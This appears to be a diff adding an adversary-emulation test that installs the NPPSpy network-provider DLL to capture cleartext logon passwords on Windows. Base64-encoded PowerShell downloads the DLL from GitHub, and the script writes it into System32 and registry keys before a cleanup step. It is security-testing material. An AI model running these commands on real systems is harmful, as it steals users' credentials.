@@ -1,0 +1,32 @@
+- id: eb4ea649-e178-5db6-9f26-5ddc1f03e4a5
+  name: Soumaia ART Tests - Credential Dumping with NPPSpy
+  description: 'Changes ProviderOrder Registry Key Parameter and creates Key for NPPSpy.
+
+    After user''s logging in cleartext password is saved in C:\NPPSpy.txt.
+
+    Clean up deletes the files and reverses Registry changes.
+
+    NPPSpy Source: https://github.com/gtworek/PSBits/tree/master/PasswordStealing/NPPSpy (requires elevation)'
+  tactic: credential-access
+  technique:
+    attack_id: T1003
+    name: OS Credential Dumping
+  platforms:
+    windows:
+      psh:
+        command: |-
+          powershell -NoProfile -EncodedCommand aQBmACAAKABUAGUAcwB0AC0AUABhAHQAaAAgACIAJABlAG4AdgA6AFQARQBNAFAAXABBAFIAVAAtAEUAeAB0AGUAcgBuAGEAbABQAGEAeQBsAG8AYQBkAHMAXABOAFAAUABTAFAAWQAuAGQAbABsACIAKQAgAHsAZQB4AGkAdAAgADAAfQAgAGUAbABzAGUAIAB7AGUAeABpAHQAIAAxAH0A
+          if ($LASTEXITCODE -ne 0) {
+              powershell -NoProfile -EncodedCommand WwBOAGUAdAAuAFMAZQByAHYAaQBjAGUAUABvAGkAbgB0AE0AYQBuAGEAZwBlAHIAXQA6ADoAUwBlAGMAdQByAGkAdAB5AFAAcgBvAHQAbwBjAG8AbAAgAD0AIABbAE4AZQB0AC4AUwBlAGMAdQByAGkAdAB5AFAAcgBvAHQAbwBjAG8AbABUAHkAcABlAF0AOgA6AFQAbABzADEAMgAKAE4AZQB3AC0ASQB0AGUAbQAgAC0AVAB5AHAAZQAgAEQAaQByAGUAYwB0AG8AcgB5ACAAIgAkAGUAbgB2ADoAVABFAE0AUABcAEEAUgBUAC0ARQB4AHQAZQByAG4AYQBsAFAAYQB5AGwAbwBhAGQAcwAiACAALQBFAHIAcgBvAHIAQQBjAHQAaQBvAG4AIABJAGcAbgBvAHIAZQAgAC0ARgBvAHIAYwBlACAAfAAgAE8AdQB0AC0ATgB1AGwAbAAKAEkAbgB2AG8AawBlAC0AVwBlAGIAUgBlAHEAdQBlAHMAdAAgAC0AVQByAGkAIABoAHQAdABwAHMAOgAvAC8AZwBpAHQAaAB1AGIALgBjAG8AbQAvAGcAdAB3AG8AcgBlAGsALwBQAFMAQgBpAHQAcwAvAHIAYQB3AC8AZgAyADIAMQBhADYAZABiADAAOABjAGIAMwBiADUAMgBkADUAZgA4AGEAMgBhADIAMQAwADYAOQAyAGUAYQA4ADkAMQAyADUAMAAxAGIAZgAvAFAAYQBzAHMAdwBvAHIAZABTAHQAZQBhAGwAaQBuAGcALwBOAFAAUABTAHAAeQAvAE4AUABQAFMAUABZAC4AZABsAGwAIAAtAE8AdQB0AEYAaQBsAGUAIAAiACQAZQBuAHYAOgBUAEUATQBQAFwAQQBSAFQALQBFAHgAdABlAHIAbgBhAGwAUABhAHkAbABvAGEAZABzAFwATgBQAFAAUwBQAFkALgBkAGwAbAAiAA==
+          }
+          Copy-Item "$env:TEMP\ART-ExternalPayloads\NPPSPY.dll" -Destination "C:\Windows\System32"
+          $path = Get-ItemProperty -Path "HKLM:\SYSTEM\CurrentControlSet\Control\NetworkProvider\Order" -Name PROVIDERORDER
+          $UpdatedValue = $Path.PROVIDERORDER + ",NPPSpy"
+          Set-ItemProperty -Path $Path.PSPath -Name "PROVIDERORDER" -Value $UpdatedValue
+          $rv = New-Item -Path HKLM:\SYSTEM\CurrentControlSet\Services\NPPSpy -ErrorAction Ignore
+          $rv = New-Item -Path HKLM:\SYSTEM\CurrentControlSet\Services\NPPSpy\NetworkProvider -ErrorAction Ignore
+          $rv = New-ItemProperty -Path HKLM:\SYSTEM\CurrentControlSet\Services\NPPSpy\NetworkProvider -Name "Class" -Value 2 -ErrorAction Ignore
+          $rv = New-ItemProperty -Path HKLM:\SYSTEM\CurrentControlSet\Services\NPPSpy\NetworkProvider -Name "Name" -Value NPPSpy -ErrorAction Ignore
+          $rv = New-ItemProperty -Path HKLM:\SYSTEM\CurrentControlSet\Services\NPPSpy\NetworkProvider -Name "ProviderPath" -PropertyType ExpandString -Value "%SystemRoot%\System32\NPPSPY.dll" -ErrorAction Ignore
+          echo "[!] Please, logout and log back in. Cleartext password for this account is going to be located in C:\NPPSpy.txt"
+        cleanup: "$cleanupPath = Get-ItemProperty -Path \"HKLM:\\SYSTEM\\CurrentControlSet\\Control\\NetworkProvider\\Order\" -Name PROVIDERORDER\n$cleanupUpdatedValue = $cleanupPath.PROVIDERORDER \n$cleanupUpdatedValue = $cleanupUpdatedValue -replace ',NPPSpy',''\nSet-ItemProperty -Path $cleanupPath.PSPath -Name \"PROVIDERORDER\" -Value $cleanupUpdatedValue\nRemove-Item -Path \"HKLM:\\SYSTEM\\CurrentControlSet\\Services\\NPPSpy\" -Recurse -ErrorAction Ignore\nRemove-Item C:\\NPPSpy.txt -ErrorAction Ignore\nRemove-Item C:\\Windows\\System32\\NPPSpy.dll -ErrorAction Ignore"
